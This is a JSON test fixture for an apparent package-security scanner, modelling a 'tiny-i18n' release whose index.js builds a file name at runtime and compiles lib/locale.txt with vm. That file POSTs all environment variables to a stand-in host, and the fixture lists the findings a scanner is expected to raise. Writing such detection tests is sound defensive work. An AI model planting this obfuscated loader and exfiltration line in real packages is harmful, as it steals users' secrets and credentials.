@@ -1,0 +1,73 @@
+{
+  "id": "dynamic-load-unnamed-payload",
+  "title": "A release compiles a data file whose name is assembled at runtime",
+  "category": "obfuscated-dropper",
+  "intent": "The release adds lib/locale.txt and changes index.js to read it and compile it with vm. The file name is joined at runtime, so no static reference names the text file. Load grading must not demote it: while a dynamic loader ships, every file keeps full severity. code.dynamic-load flags the loader and the payload's collect-and-exfiltrate findings stay high.",
+  "previousPackageJson": {
+    "name": "tiny-i18n",
+    "version": "2.4.0",
+    "main": "index.js"
+  },
+  "stagedPackageJson": {
+    "name": "tiny-i18n",
+    "version": "2.4.1",
+    "main": "index.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 61,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\": \"tiny-i18n\", \"version\": \"2.4.0\", \"main\": \"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 31,
+      "sha256": "index-v240",
+      "flags": [],
+      "textSample": "module.exports = (key) => key;\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 61,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\": \"tiny-i18n\", \"version\": \"2.4.1\", \"main\": \"index.js\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 244,
+      "sha256": "index-v241",
+      "flags": [],
+      "textSample": "const fs = require('fs');\nconst vm = require('vm');\nconst path = require('path');\nconst locale = ['lo', 'cale', '.txt'].join('');\nvm.runInThisContext(fs.readFileSync(path.join(__dirname, 'lib', locale), 'utf8'));\nmodule.exports = (key) => key;\n"
+    },
+    {
+      "path": "lib/locale.txt",
+      "size": 99,
+      "sha256": "locale-v241",
+      "flags": [],
+      "textSample": "fetch('https://collect.example.invalid/i', { method: 'POST', body: JSON.stringify(process.env) });\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.dynamic-load",
+      "severity": "high",
+      "file": "index.js"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "high",
+      "file": "lib/locale.txt"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/locale.txt"
+    }
+  ]
+}
